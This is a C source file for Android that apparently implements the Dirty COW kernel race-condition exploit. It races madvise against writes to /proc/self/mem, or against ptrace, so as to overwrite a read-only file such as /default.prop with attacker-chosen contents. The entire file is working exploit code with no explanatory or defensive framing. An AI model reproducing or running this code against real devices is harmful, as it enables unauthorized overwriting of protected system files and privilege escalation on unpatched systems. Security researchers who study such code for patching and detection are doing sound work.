#include <err.h>
#include <errno.h>
#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/ptrace.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif

#define LOOP   0x1000000
#define TIMEOUT 1000

pid_t pid;

struct mem_arg  {
	void *offset;
	void *patch;
	off_t patch_size;
	const char *fname;
	volatile int stop;
	volatile int success;
};

static void *checkThread(void *arg) {
	struct mem_arg *mem_arg;
	mem_arg = (struct mem_arg *)arg;
	struct stat st;
	int i;
	char * newdata = malloc(mem_arg->patch_size);
	for(i = 0; i < TIMEOUT && !mem_arg->stop; i++) {
		int f=open(mem_arg->fname, O_RDONLY);
		if (f == -1) {
			LOGV("could not open %s", mem_arg->fname);
			break;
		}
		if (fstat(f,&st) == -1) {
			LOGV("could not stat %s", mem_arg->fname);
			close(f);
			break;
		}
		read(f, newdata, mem_arg->patch_size);
		close(f);

		int memcmpret = memcmp(newdata, mem_arg->patch, mem_arg->patch_size);
		if (memcmpret == 0) {
			mem_arg->stop = 1;
			mem_arg->success = 1;
			return 0;
		}
		usleep(100 * 1000);
	}
	mem_arg->stop = 1;
	return 0;
}

static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);

	LOGV("[*] madvise = %p %zd", addr, size);

	for(i = 0; i < LOOP && !mem_arg->stop; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
	}

	LOGV("[*] madvise = %d %d", c, i);
	mem_arg->stop = 1;
	return 0;
}

static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n)
{
	const unsigned char *s;
	unsigned long value;
	unsigned char *d;

	d = dest;
	s = src;

	while (n >= sizeof(long)) {
		memcpy(&value, s, sizeof(value));
		if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
			warn("ptrace(PTRACE_POKETEXT)");
			return -1;
		}

		n -= sizeof(long);
		d += sizeof(long);
		s += sizeof(long);
	}

	if (n > 0) {
		d -= sizeof(long) - n;

		errno = 0;
		value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
		if (value == -1 && errno != 0) {
			warn("ptrace(PTRACE_PEEKTEXT)");
			return -1;
		}

		memcpy((unsigned char *)&value + sizeof(value) - n, s, n);
		if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
			warn("ptrace(PTRACE_POKETEXT)");
			return -1;
		}
	}

	return 0;
}

static void *ptraceThread(void *arg)
{
	struct mem_arg *mem_arg;
	mem_arg = (struct mem_arg *)arg;

	int i, c;
	for (i = 0; i < LOOP && !mem_arg->stop; i++) {
		c = ptrace_memcpy(pid, mem_arg->offset, mem_arg->patch, mem_arg->patch_size);
	}

	LOGV("[*] ptrace %d %i", c, i);

	mem_arg->stop = 1;
	return NULL;
}

int canwritetoselfmem(void *arg) {
	struct mem_arg *mem_arg;
	mem_arg = (struct mem_arg *)arg;
	int fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1) {
		LOGV("open(\"/proc/self/mem\"");
	}
	int returnval = -1;
	lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
	if (write(fd, mem_arg->patch, mem_arg->patch_size) == mem_arg->patch_size) {
		returnval = 0;
	}

	close(fd);
	return returnval;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	mem_arg = (struct mem_arg *)arg;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1) {
		LOGV("open(\"/proc/self/mem\"");
	}

	for (i = 0; i < LOOP && !mem_arg->stop; i++) {
		lseek(fd, (off_t)mem_arg->offset, SEEK_SET);
		c += write(fd, mem_arg->patch, mem_arg->patch_size);
	}

	LOGV("[*] /proc/self/mem %d %i", c, i);

	close(fd);

	mem_arg->stop = 1;
	return NULL;
}

static void exploit(struct mem_arg *mem_arg)
{
	pthread_t pth1, pth2, pth3;

	LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	mem_arg->stop = 0;
	mem_arg->success = 0;

	if (canwritetoselfmem(mem_arg) == -1) {
		LOGV("[*] using ptrace method");
		pid=fork();
		if(pid) {
			pthread_create(&pth3, NULL, checkThread, mem_arg);
			waitpid(pid,NULL,0);
			ptraceThread((void*)mem_arg);
			pthread_join(pth3, NULL);
		} else {
			pthread_create(&pth1, NULL, madviseThread, mem_arg);
			ptrace(PTRACE_TRACEME);
			kill(getpid(),SIGSTOP);
			pthread_join(pth1, NULL);
		}
	} else {
		LOGV("[*] using /proc/self/mem method");
		pthread_create(&pth3, NULL, checkThread, mem_arg);
		pthread_create(&pth1, NULL, madviseThread, mem_arg);
		pthread_create(&pth2, NULL, procselfmemThread, mem_arg);
		pthread_join(pth3, NULL);
		pthread_join(pth1, NULL);
		pthread_join(pth2, NULL);
	}

	LOGV("[*] exploited %d %p=%lx", pid, (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}

int dcow(int argc, const char * argv[])
{
	if (argc < 2) {
		LOGV("usage %s /data/local/tmp/default.prop /default.prop", argv[0]);
		return 0;
	}

	const char * fromfile = argv[1];
	const char * tofile = argv[2];
	LOGV("dcow %s %s", fromfile, tofile);

	struct mem_arg mem_arg;
	struct stat st;
	struct stat st2;

	int f = open(tofile, O_RDONLY);
	if (f == -1) {
		LOGV("could not open %s", tofile);
		return -1;
	}
	if (fstat(f,&st) == -1) {
		LOGV("could not stat %s", tofile);
		return 1;
	}

	int f2=open(fromfile, O_RDONLY);
	if (f2 == -1) {
		LOGV("could not open %s", fromfile);
		return 2;
	}
	if (fstat(f2,&st2) == -1) {
		LOGV("could not stat %s", fromfile);
		return 3;
	}

	size_t size = st2.st_size;
	if (st2.st_size != st.st_size) {
		LOGV("warning: new file size (%lld) and destination file size (%lld) differ\n", (unsigned long long)st2.st_size, (unsigned long long)st.st_size);
		if (st2.st_size > st.st_size) {
			LOGV("corruption?\n");
		} else {
			size = st.st_size;
		}
	}

	LOGV("[*] size %zd", size);
	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL) {
		return 4;
	}

	mem_arg.patch_size = size;
	memset(mem_arg.patch, 0, size);

	mem_arg.fname = argv[2];

	read(f2, mem_arg.patch, size);
	close(f2);

	/*read(f, mem_arg.unpatch, st.st_size);*/

	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
	if (map == MAP_FAILED) {
		LOGV("mmap");
		return 5;
	}

	LOGV("[*] mmap %p", map);

	mem_arg.offset = map;

	exploit(&mem_arg);

	close(f);
	// to put back
	/*exploit(&mem_arg, 0);*/
	if (mem_arg.success == 0) {
		return -1;
	}

	return 0;
}
